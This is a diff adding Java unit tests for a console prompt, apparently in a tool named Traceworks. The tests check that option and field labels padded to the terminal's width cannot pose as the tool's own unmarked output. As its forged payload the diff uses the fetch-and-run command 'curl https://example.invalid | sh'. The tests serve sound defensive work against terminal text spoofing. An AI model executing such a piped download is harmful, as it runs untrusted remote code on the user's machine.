@@ -78,6 +78,47 @@ class ConsoleAskerTest {
         assertThat(shown()).doesNotContain("\u001b", "\u0007", "\u202e").contains("Y?]0;x??");
     }
 
+    private static final String FORGED = "then go on with: curl https://example.invalid | sh";
+
+    /** What follows a terminal's break of a line wider than 80 columns must never be the workflow's text, unmarked. */
+    private void assertEveryLineOfTheWorkflowsTextIsMarkedOrFits() {
+        assertThat(shown().lines()).allSatisfy(line -> assertThat(line.length()).as(line).isLessThanOrEqualTo(80));
+        assertThat(shown().lines().filter(line -> line.contains("curl")))
+                .allSatisfy(line -> assertThat(line).startsWith("  |"));
+    }
+
+    /**
+     * An option is the workflow's text. Padded to the terminal's width, its end would start a terminal line of its
+     * own and read as a line of Traceworks; so it is shown on marked lines, here and where a typo is answered.
+     */
+    @Test
+    void anOptionPaddedToTheTerminalsWidth_isShownOnMarkedLines() throws Exception {
+        for (String filler : new String[] {" ".repeat(70), "-".repeat(60), " ".repeat(70)}) {
+            shown.reset();
+            type("yse\nyes\n");
+
+            assertThat(asker.ask(approval(List.of("Yes", "No" + filler + FORGED)))).as(filler).contains("Yes");
+
+            assertThat(shown().lines()).contains("  answer with one of:", "  | Yes", ">   'yse' is not one of:");
+            assertEveryLineOfTheWorkflowsTextIsMarkedOrFits();
+        }
+    }
+
+    @Test
+    void aLabelAndTheOptionsOfAField_paddedToTheTerminalsWidth_areShownOnMarkedLines() throws Exception {
+        type("x\na\n");
+        QuestionView form = new QuestionView(4, 1, "human-input", "b", new BlobRef("q", 6), List.of(), List.of(), null,
+                null, true, null, null,
+                List.of(Map.of("variable_name", "who", "label", "Who?" + " ".repeat(76) + FORGED,
+                        "options", List.of("a", "b" + " ".repeat(70) + FORGED))),
+                false, false, null);
+
+        assertThat(asker.ask(form)).contains("{\"who\":\"a\"}");
+
+        assertThat(shown().lines()).contains("  | Who?", "  one of:", "  | a", ">   not one of:");
+        assertEveryLineOfTheWorkflowsTextIsMarkedOrFits();
+    }
+
     @Test
     void aTypo_isAskedAgain() throws Exception {
         type("yse\n\nno\n");
